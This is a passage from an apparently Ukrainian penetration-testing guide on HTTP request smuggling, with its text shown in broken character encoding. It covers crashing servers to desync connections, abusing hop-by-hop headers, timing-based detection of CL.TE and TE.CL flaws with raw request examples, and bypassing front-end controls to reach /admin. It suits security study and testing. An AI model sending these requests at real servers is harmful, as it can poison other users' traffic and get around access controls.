#### –õ–æ–º–∞–Ω–Ω—è –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞

–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ —Ç–∞–∫–æ–∂ –∫–æ—Ä–∏—Å–Ω–∞ –≤ —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, –¥–µ –º–æ–∂–ª–∏–≤–æ **–∑–ª–∞–º–∞—Ç–∏ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –ø—ñ–¥ —á–∞—Å —á–∏—Ç–∞–Ω–Ω—è –ø–æ—á–∞—Ç–∫–æ–≤–∏—Ö HTTP-–¥–∞–Ω–∏—Ö**, –∞–ª–µ **–±–µ–∑ –∑–∞–∫—Ä–∏—Ç—Ç—è –∑'—î–¥–Ω–∞–Ω–Ω—è**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, **—Ç—ñ–ª–æ** HTTP-–∑–∞–ø–∏—Ç—É –±—É–¥–µ –≤–≤–∞–∂–∞—Ç–∏—Å—è **–Ω–∞—Å—Ç—É–ø–Ω–∏–º HTTP-–∑–∞–ø–∏—Ç–æ–º**.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫ –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è –≤ [**—Ü—å–æ–º—É –æ–ø–∏—Å—ñ**](https://mizu.re/post/twisty-python), —É Werkzeug –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –¥–µ—è–∫—ñ **Unicode** —Å–∏–º–≤–æ–ª–∏, —ñ —Ü–µ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ **–∑–ª–∞–º—É** —Å–µ—Ä–≤–µ—Ä–∞. –û–¥–Ω–∞–∫, —è–∫—â–æ HTTP-–∑'—î–¥–Ω–∞–Ω–Ω—è –±—É–ª–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ –∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–º **`Connection: keep-alive`**, —Ç—ñ–ª–æ –∑–∞–ø–∏—Ç—É –Ω–µ –±—É–¥–µ –ø—Ä–æ—á–∏—Ç–∞–Ω–æ, —ñ –∑'—î–¥–Ω–∞–Ω–Ω—è –∑–∞–ª–∏—à–∏—Ç—å—Å—è –≤—ñ–¥–∫—Ä–∏—Ç–∏–º, —Ç–æ–º—É **—Ç—ñ–ª–æ** –∑–∞–ø–∏—Ç—É –±—É–¥–µ —Ä–æ–∑–≥–ª—è–¥–∞—Ç–∏—Å—è —è–∫ **–Ω–∞—Å—Ç—É–ø–Ω–∏–π HTTP-–∑–∞–ø–∏—Ç**.

#### –ü—Ä–∏–º—É—Å —á–µ—Ä–µ–∑ –∑–∞–≥–æ–ª–æ–≤–∫–∏ hop-by-hop

–ó–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ hop-by-hop, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –ø—Ä–æ–∫—Å—ñ **–≤–∏–¥–∞–ª–∏—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ Content-Length –∞–±–æ Transfer-Encoding, —â–æ–± –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è HTTP-–∑–∞–ø–∏—Ç–æ–º —Å—Ç–∞–ª–æ –º–æ–∂–ª–∏–≤–∏–º**.
```
Connection: Content-Length
```
–î–ª—è **–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –∑–∞–≥–æ–ª–æ–≤–∫–∏ hop-by-hop** –≤—ñ–¥–≤—ñ–¥–∞–π—Ç–µ:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## –í–∏—è–≤–ª–µ–Ω–Ω—è HTTP Request Smuggling

–í–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π HTTP request smuggling —á–∞—Å—Ç–æ –º–æ–∂–Ω–∞ –¥–æ—Å—è–≥—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ—Ö–Ω—ñ–∫ —Ç–∞–π–º—ñ–Ω–≥—É, —è–∫—ñ –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ —Å–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—ñ –∑–∞ —Ç–∏–º, —Å–∫—ñ–ª—å–∫–∏ —á–∞—Å—É –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–µ—Ä–≤–µ—Ä—É –¥–ª—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ –º–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω—ñ –∑–∞–ø–∏—Ç–∏. –¶—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –æ—Å–æ–±–ª–∏–≤–æ –∫–æ—Ä–∏—Å–Ω—ñ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π CL.TE —Ç–∞ TE.CL. –û–∫—Ä—ñ–º —Ü–∏—Ö –º–µ—Ç–æ–¥—ñ–≤, —ñ—Å–Ω—É—é—Ç—å —ñ–Ω—à—ñ —Å—Ç—Ä–∞—Ç–µ–≥—ñ—ó —Ç–∞ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —Ç–∞–∫–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π:

### –í–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π CL.TE –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ—Ö–Ω—ñ–∫ —Ç–∞–π–º—ñ–Ω–≥—É

* **–ú–µ—Ç–æ–¥:**
* –ù–∞–¥—ñ—à–ª—ñ—Ç—å –∑–∞–ø–∏—Ç, —è–∫–∏–π, —è–∫—â–æ –¥–æ–¥–∞—Ç–æ–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π, –∑–º—É—Å–∏—Ç—å —Å–µ—Ä–≤–µ—Ä –Ω–∞ –∑–∞–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ —á–µ–∫–∞—Ç–∏ –Ω–∞ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–∞–Ω—ñ.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **–°–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—è:**
* –°–µ—Ä–≤–µ—Ä –Ω–∞ –ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ –æ–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ `Content-Length` —ñ –ø–µ—Ä–µ–¥—á–∞—Å–Ω–æ –æ–±—Ä–∏–≤–∞—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.
* –°–µ—Ä–≤–µ—Ä –Ω–∞ –∑–∞–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ, –æ—á—ñ–∫—É—é—á–∏ –Ω–∞ —á–∞—Å—Ç–∏–Ω—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, —á–µ–∫–∞—î –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—É —á–∞—Å—Ç–∏–Ω—É, —è–∫–∞ –Ω—ñ–∫–æ–ª–∏ –Ω–µ –ø—Ä–∏—Ö–æ–¥–∏—Ç—å, —â–æ –≤–∏–∫–ª–∏–∫–∞—î –∑–∞—Ç—Ä–∏–º–∫—É.
* **–Ü–Ω–¥–∏–∫–∞—Ç–æ—Ä–∏:**
* –¢–∞–π–º-–∞—É—Ç–∏ –∞–±–æ —Ç—Ä–∏–≤–∞–ª—ñ –∑–∞—Ç—Ä–∏–º–∫–∏ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.
* –û—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ–º–∏–ª–∫–∏ 400 Bad Request –≤—ñ–¥ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ –∑–∞–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ, —ñ–Ω–æ–¥—ñ –∑ –¥–µ—Ç–∞–ª—å–Ω–æ—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –ø—Ä–æ —Å–µ—Ä–≤–µ—Ä.

### –í–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π TE.CL –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ—Ö–Ω—ñ–∫ —Ç–∞–π–º—ñ–Ω–≥—É

* **–ú–µ—Ç–æ–¥:**
* –ù–∞–¥—ñ—à–ª—ñ—Ç—å –∑–∞–ø–∏—Ç, —è–∫–∏–π, —è–∫—â–æ –¥–æ–¥–∞—Ç–æ–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π, –∑–º—É—Å–∏—Ç—å —Å–µ—Ä–≤–µ—Ä –Ω–∞ –∑–∞–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ —á–µ–∫–∞—Ç–∏ –Ω–∞ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–∞–Ω—ñ.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **–°–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—è:**
* –°–µ—Ä–≤–µ—Ä –Ω–∞ –ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ –æ–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ `Transfer-Encoding` —ñ –ø–µ—Ä–µ—Å–∏–ª–∞—î –≤—Å–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.
* –°–µ—Ä–≤–µ—Ä –Ω–∞ –∑–∞–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ, –æ—á—ñ–∫—É—é—á–∏ –Ω–∞ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ `Content-Length`, —á–µ–∫–∞—î –Ω–∞ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–∞–Ω—ñ, —è–∫—ñ –Ω—ñ–∫–æ–ª–∏ –Ω–µ –ø—Ä–∏—Ö–æ–¥—è—Ç—å, —â–æ –≤–∏–∫–ª–∏–∫–∞—î –∑–∞—Ç—Ä–∏–º–∫—É.

### –Ü–Ω—à—ñ –º–µ—Ç–æ–¥–∏ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π

* **–ê–Ω–∞–ª—ñ–∑ –¥–∏—Ñ–µ—Ä–µ–Ω—Ü—ñ–π–Ω–∏—Ö –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π:**
* –ù–∞–¥—ñ—à–ª—ñ—Ç—å —Ç—Ä–æ—Ö–∏ –∑–º—ñ–Ω–µ–Ω—ñ –≤–µ—Ä—Å—ñ—ó –∑–∞–ø–∏—Ç—É —Ç–∞ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–π—Ç–µ, —á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Å–µ—Ä–≤–µ—Ä–∞ –≤—ñ–¥—Ä—ñ–∑–Ω—è—é—Ç—å—Å—è –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω–∏–º —á–∏–Ω–æ–º, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —Ä–æ–∑–±—ñ–∂–Ω—ñ—Å—Ç—å —É –ø–∞—Ä—Å–∏–Ω–≥—É.
* **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤:**
* –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è 'HTTP Request Smuggler' Burp Suite, –º–æ–∂—É—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ —Ü—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ —Ä—ñ–∑–Ω—ñ —Ñ–æ—Ä–º–∏ –Ω–µ–æ–¥–Ω–æ–∑–Ω–∞—á–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤ —ñ –∞–Ω–∞–ª—ñ–∑—É—é—á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.
* **–¢–µ—Å—Ç–∏ –Ω–∞ –≤–∞—Ä—ñ–∞—Ü—ñ—é Content-Length:**
* –ù–∞–¥—Å–∏–ª–∞–π—Ç–µ –∑–∞–ø–∏—Ç–∏ –∑ —Ä—ñ–∑–Ω–∏–º–∏ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ `Content-Length`, —è–∫—ñ –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Ñ–∞–∫—Ç–∏—á–Ω—ñ–π –¥–æ–≤–∂–∏–Ω—ñ –≤–º—ñ—Å—Ç—É, —ñ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–π—Ç–µ, —è–∫ —Å–µ—Ä–≤–µ—Ä –æ–±—Ä–æ–±–ª—è—î —Ç–∞–∫—ñ –Ω–µ–≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ.
* **–¢–µ—Å—Ç–∏ –Ω–∞ –≤–∞—Ä—ñ–∞—Ü—ñ—é Transfer-Encoding:**
* –ù–∞–¥—Å–∏–ª–∞–π—Ç–µ –∑–∞–ø–∏—Ç–∏ –∑ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–∏–º–∏ –∞–±–æ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ —Å—Ñ–æ—Ä–º–æ–≤–∞–Ω–∏–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ `Transfer-Encoding` —ñ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–π—Ç–µ, —è–∫ –ø–æ-—Ä—ñ–∑–Ω–æ–º—É —Ä–µ–∞–≥—É—é—Ç—å —Å–µ—Ä–≤–µ—Ä–∏ –Ω–∞ –ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ç–∞ –∑–∞–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ –Ω–∞ —Ç–∞–∫—ñ –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó.

### –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π HTTP Request Smuggling

–ü—ñ—Å–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ —Ç–µ—Ö–Ω—ñ–∫ —Ç–∞–π–º—ñ–Ω–≥—É –≤–∞–∂–ª–∏–≤–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º–æ–∂–Ω–∞ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –∑–∞–ø–∏—Ç–∞–º–∏ –∫–ª—ñ—î–Ω—Ç–∞. –ü—Ä–æ—Å—Ç–∏–π –º–µ—Ç–æ–¥ - —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä—É—ó—Ç–∏ —Å–≤–æ—ó –∑–∞–ø–∏—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑—Ä–æ–±–∏–≤—à–∏ –∑–∞–ø–∏—Ç –¥–æ `/`, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å 404. –ü—Ä–∏–∫–ª–∞–¥–∏ `CL.TE` —Ç–∞ `TE.CL`, –æ–±–≥–æ–≤–æ—Ä–µ–Ω—ñ —Ä–∞–Ω—ñ—à–µ –≤ [–û—Å–Ω–æ–≤–Ω–∏—Ö –ø—Ä–∏–∫–ª–∞–¥–∞—Ö](./#basic-examples), –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—Ç—å, —è–∫ –æ—Ç—Ä—É—ó—Ç–∏ –∑–∞–ø–∏—Ç –∫–ª—ñ—î–Ω—Ç–∞, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å 404, –Ω–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —Ç–µ, —â–æ –∫–ª—ñ—î–Ω—Ç –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —ñ–Ω—à–æ–≥–æ —Ä–µ—Å—É—Ä—Å—É.

**–ö–ª—é—á–æ–≤—ñ –º—ñ—Ä–∫—É–≤–∞–Ω–Ω—è**

–ü—Ä–∏ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—ñ –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ request smuggling, –≤—Ç—Ä—É—á–∞—é—á–∏—Å—å –≤ —ñ–Ω—à—ñ –∑–∞–ø–∏—Ç–∏, –ø–∞–º'—è—Ç–∞–π—Ç–µ:

* **–í—ñ–¥–æ–∫—Ä–µ–º–ª–µ–Ω—ñ –º–µ—Ä–µ–∂–µ–≤—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è:** "–∞—Ç–∞–∫–∞" —Ç–∞ "–Ω–æ—Ä–º–∞–ª—å–Ω—ñ" –∑–∞–ø–∏—Ç–∏ –ø–æ–≤–∏–Ω–Ω—ñ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ –æ–∫—Ä–µ–º—ñ –º–µ—Ä–µ–∂–µ–≤—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –æ–¥–Ω–æ–≥–æ –π —Ç–æ–≥–æ –∂ –∑'—î–¥–Ω–∞–Ω–Ω—è –¥–ª—è –æ–±–æ—Ö –Ω–µ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.
* **–ü–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ URL —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏:** –ù–∞–º–∞–≥–∞–π—Ç–µ—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–¥–Ω–∞–∫–æ–≤—ñ URL —Ç–∞ —ñ–º–µ–Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –¥–ª—è –æ–±–æ—Ö –∑–∞–ø–∏—Ç—ñ–≤. –°—É—á–∞—Å–Ω—ñ –¥–æ–¥–∞—Ç–∫–∏ —á–∞—Å—Ç–æ –º–∞—Ä—à—Ä—É—Ç–∏–∑—É—é—Ç—å –∑–∞–ø–∏—Ç–∏ –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö —Å–µ—Ä–≤–µ—Ä—ñ–≤ –Ω–∞ –∑–∞–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ –Ω–∞ –æ—Å–Ω–æ–≤—ñ URL —Ç–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤. –í—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ—Å—Ç—å —Ü–∏–º –ø—ñ–¥–≤–∏—â—É—î –π–º–æ–≤—ñ—Ä–Ω—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ –æ–±–∏–¥–≤–∞ –∑–∞–ø–∏—Ç–∏ –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è –æ–¥–Ω–∏–º —ñ —Ç–∏–º –∂–µ —Å–µ—Ä–≤–µ—Ä–æ–º, —â–æ —î –ø–µ—Ä–µ–¥—É–º–æ–≤–æ—é –¥–ª—è —É—Å–ø—ñ—à–Ω–æ—ó –∞—Ç–∞–∫–∏.
* **–¢–∞–π–º—ñ–Ω–≥ —Ç–∞ —É–º–æ–≤–∏ –≥–æ–Ω–∫–∏:** "–Ω–æ—Ä–º–∞–ª—å–Ω–∏–π" –∑–∞–ø–∏—Ç, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ç—Ä—É—á–∞–Ω–Ω—è –∑ –±–æ–∫—É "–∞—Ç–∞–∫–∏", –∫–æ–Ω–∫—É—Ä—É—î –∑ —ñ–Ω—à–∏–º–∏ –æ–¥–Ω–æ—á–∞—Å–Ω–∏–º–∏ –∑–∞–ø–∏—Ç–∞–º–∏ –¥–æ–¥–∞—Ç–∫–∞. –¢–æ–º—É –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ "–Ω–æ—Ä–º–∞–ª—å–Ω–∏–π" –∑–∞–ø–∏—Ç –≤—ñ–¥—Ä–∞–∑—É –ø—ñ—Å–ª—è "–∞—Ç–∞–∫–∏". –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –¥–æ–¥–∞—Ç–∫–∏ –º–æ–∂—É—Ç—å –≤–∏–º–∞–≥–∞—Ç–∏ –∫—ñ–ª—å–∫–æ—Ö —Å–ø—Ä–æ–± –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.
* **–í–∏–∫–ª–∏–∫–∏ –±–∞–ª–∞–Ω—Å—É–≤–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:** –°–µ—Ä–≤–µ—Ä–∏ –Ω–∞ –ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ—ó –±–∞–ª–∞–Ω—Å—É–≤–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, –º–æ–∂—É—Ç—å —Ä–æ–∑–ø–æ–¥—ñ–ª—è—Ç–∏ –∑–∞–ø–∏—Ç–∏ –º—ñ–∂ —Ä—ñ–∑–Ω–∏–º–∏ —Å–∏—Å—Ç–µ–º–∞–º–∏ –Ω–∞ –∑–∞–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ. –Ø–∫—â–æ "–∞—Ç–∞–∫–∞" —Ç–∞ "–Ω–æ—Ä–º–∞–ª—å–Ω—ñ" –∑–∞–ø–∏—Ç–∏ –ø–æ—Ç—Ä–∞–ø–ª—è—é—Ç—å –Ω–∞ —Ä—ñ–∑–Ω—ñ —Å–∏—Å—Ç–µ–º–∏, –∞—Ç–∞–∫–∞ –Ω–µ –≤–¥–∞—Å—Ç—å—Å—è. –¶–µ–π –∞—Å–ø–µ–∫—Ç –±–∞–ª–∞–Ω—Å—É–≤–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–∂–µ –≤–∏–º–∞–≥–∞—Ç–∏ –∫—ñ–ª—å–∫–æ—Ö —Å–ø—Ä–æ–± –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.
* **–ù–µ–ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–∏–π –≤–ø–ª–∏–≤ –Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:** –Ø–∫—â–æ –≤–∞—à–∞ –∞—Ç–∞–∫–∞ –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ –∑–∞–ø–∏—Ç —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω–µ "–Ω–æ—Ä–º–∞–ª—å–Ω–∏–π" –∑–∞–ø–∏—Ç, —è–∫–∏–π –≤–∏ –Ω–∞–¥—ñ—Å–ª–∞–ª–∏ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è), —Ü–µ –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ –≤–∞—à–∞ –∞—Ç–∞–∫–∞ –≤–ø–ª–∏–Ω—É–ª–∞ –Ω–∞ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ–¥–∞—Ç–∫–∞. –ü–æ—Å—Ç—ñ–π–Ω–µ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –º–æ–∂–µ –ø–æ—Ä—É—à–∏—Ç–∏ —Ä–æ–±–æ—Ç—É —ñ–Ω—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —â–æ –≤–∏–º–∞–≥–∞—î –æ–±–µ—Ä–µ–∂–Ω–æ–≥–æ –ø—ñ–¥—Ö–æ–¥—É.

## –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è HTTP Request Smuggling

### –û–±—Ö—ñ–¥ –±–µ–∑–ø–µ–∫–∏ –Ω–∞ –ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ —á–µ—Ä–µ–∑ HTTP Request Smuggling

–Ü–Ω–æ–¥—ñ –ø—Ä–æ–∫—Å—ñ-—Å–µ—Ä–≤–µ—Ä–∏ –Ω–∞ –ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ –≤–ø—Ä–æ–≤–∞–¥–∂—É—é—Ç—å –∑–∞—Ö–æ–¥–∏ –±–µ–∑–ø–µ–∫–∏, –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ –≤—Ö—ñ–¥–Ω—ñ –∑–∞–ø–∏—Ç–∏. –û–¥–Ω–∞–∫ —Ü—ñ –∑–∞—Ö–æ–¥–∏ –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏, –µ–∫—Å–ø–ª—É–∞—Ç—É—é—á–∏ HTTP Request Smuggling, —â–æ –¥–æ–∑–≤–æ–ª—è—î –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–º–µ–∂–µ–Ω–∏—Ö –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–æ—Å—Ç—É–ø –¥–æ `/admin` –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–∏–π –∑–æ–≤–Ω—ñ, –∞ –ø—Ä–æ–∫—Å—ñ –Ω–∞ –ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø–ª–∞–Ω—ñ –∞–∫—Ç–∏–≤–Ω–æ –±–ª–æ–∫—É—î —Ç–∞–∫—ñ —Å–ø—Ä–æ–±–∏. –ü—Ä–æ—Ç–µ —Ü–µ–π –ø—Ä–æ–∫—Å—ñ –º–æ–∂–µ –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –≤–±—É–¥–æ–≤–∞–Ω—ñ –∑–∞–ø–∏—Ç–∏ –≤ –º–µ–∂–∞—Ö –ø—Ä–∏—Ö–æ–≤–∞–Ω–æ–≥–æ HTTP –∑–∞–ø–∏—Ç—É, –∑–∞–ª–∏—à–∞—é—á–∏ –ª–∞–∑—ñ–≤–∫—É –¥–ª—è –æ–±—Ö–æ–¥—É —Ü–∏—Ö –æ–±–º–µ–∂–µ–Ω—å.

